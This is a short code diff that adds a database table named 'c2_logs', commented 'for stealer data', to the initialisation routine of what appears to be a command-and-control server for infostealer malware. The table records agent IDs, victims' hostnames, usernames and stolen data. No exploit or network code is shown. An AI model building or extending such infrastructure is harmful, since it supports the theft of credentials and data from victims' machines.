@@ -194,6 +194,20 @@ async function initDatabase() {
             )
         `);
 
+        // Create C2 logs table for stealer data
+        await connection.query(`
+            CREATE TABLE IF NOT EXISTS c2_logs (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                agent_id VARCHAR(64) NOT NULL,
+                hostname VARCHAR(255),
+                username VARCHAR(255),
+                log_type VARCHAR(255) NOT NULL,
+                data JSON,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
+            )
+        `);
+
         await connection.query(`
             CREATE TABLE IF NOT EXISTS users (
                 id INT AUTO_INCREMENT PRIMARY KEY,
